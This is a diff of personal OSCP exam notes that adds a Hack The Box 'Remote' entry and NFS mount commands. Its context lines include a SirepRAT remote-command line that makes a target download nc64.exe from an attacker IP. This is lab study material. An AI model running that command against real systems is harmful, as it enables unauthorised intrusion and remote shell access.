@@ -81,7 +81,8 @@ https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md
 | Jerry | Tomcat default credential, deploy | no need ||
 | Love | SSRF Gopher MySQL | AlwaysInstallElevated ||
 | Omni | IoT exploit | *SAM SYSTEM hash, Export-Clixml, GetNetworkCredential ||
-| Optimum | HttpFileServer 2.3 | MS16-098 || 
+| Optimum | HttpFileServer 2.3 | MS16-098 ||
+| Remote | NFS Service(default port 2049), mount, sdf, Umbraco CMS | SeImpersonatePrivilege, TeamViewer |
 
 (*):review before the exam
 
@@ -369,4 +370,14 @@ Used in ```Omni```
 
 ```
 python SirepRAT.py <target ip> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c     Powershell Invoke-WebRequest -OutFile C:\Data\Users\DefaultAccount\Documents\nc64.exe -Uri http://<attacker ip>/nc64.exe "
+```
+
+Used in ```Remote```
+
+NFS Service
+
+```shell
+showmount -e <target ip>
+mkdir /tmp/test_folder
+sudo mount -t nfs <target ip>:/<folder> /tmp/test_folder -o nolock
 ```
